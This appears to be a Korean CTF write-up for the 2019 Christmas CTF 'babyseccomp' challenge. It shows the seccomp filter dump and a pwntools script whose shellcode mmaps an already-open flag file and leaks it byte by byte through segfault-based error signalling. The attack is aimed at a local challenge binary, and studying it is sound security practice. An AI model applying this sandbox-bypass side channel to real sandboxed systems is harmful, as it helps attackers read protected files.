---
title: "2019 Christmas CTF babyseccomp"
date: 2020-4-5
ctf: Christmas CTF
layout: post
---

* Error based shellcoding
* mmap

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x19 0xc000003e  if (A != ARCH_X86_64) goto 0027
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x25 0x17 0x00 0x40000000  if (A > 0x40000000) goto 0027
 0004: 0x15 0x16 0x00 0x0000003b  if (A == execve) goto 0027
 0005: 0x15 0x15 0x00 0x00000142  if (A == execveat) goto 0027
 0006: 0x15 0x14 0x00 0x00000002  if (A == open) goto 0027
 0007: 0x15 0x13 0x00 0x00000101  if (A == openat) goto 0027
 0008: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0027
 0009: 0x15 0x11 0x00 0x00000011  if (A == pread64) goto 0027
 0010: 0x15 0x10 0x00 0x00000013  if (A == readv) goto 0027
 0011: 0x15 0x0f 0x00 0x00000127  if (A == preadv) goto 0027
 0012: 0x15 0x0e 0x00 0x00000147  if (A == preadv2) goto 0027
 0013: 0x15 0x0d 0x00 0x00000001  if (A == write) goto 0027
 0014: 0x15 0x0c 0x00 0x00000012  if (A == pwrite64) goto 0027
 0015: 0x15 0x0b 0x00 0x00000014  if (A == writev) goto 0027
 0016: 0x15 0x0a 0x00 0x00000128  if (A == pwritev) goto 0027
 0017: 0x15 0x09 0x00 0x00000148  if (A == pwritev2) goto 0027
 0018: 0x15 0x08 0x00 0x00000028  if (A == sendfile) goto 0027
 0019: 0x15 0x07 0x00 0x00000038  if (A == clone) goto 0027
 0020: 0x15 0x06 0x00 0x00000039  if (A == fork) goto 0027
 0021: 0x15 0x05 0x00 0x00000065  if (A == ptrace) goto 0027
 0022: 0x15 0x04 0x00 0x00000029  if (A == socket) goto 0027
 0023: 0x15 0x03 0x00 0x0000002b  if (A == accept) goto 0027
 0024: 0x15 0x02 0x00 0x00000031  if (A == bind) goto 0027
 0025: 0x15 0x01 0x00 0x00000032  if (A == listen) goto 0027
 0026: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0027: 0x06 0x00 0x00 0x00000000  return KILL
```

prctl을 이용해서 seccomp rule 설정하고 /flag를 open해놓는다. 그리고 0x1000만큼 쉘코드를 입력해서 실행해준다. 필터링은 위에처럼 되어있는데 이미 flag를 open했으니까 mmap은 필터링 안되어있어서 1글자씩 브포해주면 된다. Segfault 뜨는걸 이용해서 Error Based Shellcoding을 해준다.

> exploit.py

```python
from pwn import *
import string
context.arch = 'amd64'
flag = ''
# mmap(0,0x1000,PROT_READ,MAP_SHARED,3,0)
for i in range(100):
	for j in string.printable:
		p = process('./babyseccomp')
		print j
		s = '''
		mov rdi, 0
		mov rsi, 0x1000 
		mov rdx, 1
		mov r10, 1
		mov r8, 3
		mov r9, 0
		mov rax, 9
		syscall

		mov rsi, rax
		test:
			mov bl, BYTE PTR[rax+{}]
		check:
			mov cl, {}
			cmp bl, cl
			mov rax, 0xdeadbeef
			jne test
			jmp loop
		loop:
			jmp loop

		'''.format(i,ord(j))
		p.sendafter(':',asm(s))

		try:
			p.recvuntil("Seg", timeout=1)
			print 'Correct'
			flag += j
			print flag
			if j == '}':
				exit(0)
			p.close()
		except:
			print('fail')
			p.close()

print flag

p.interactive()
```

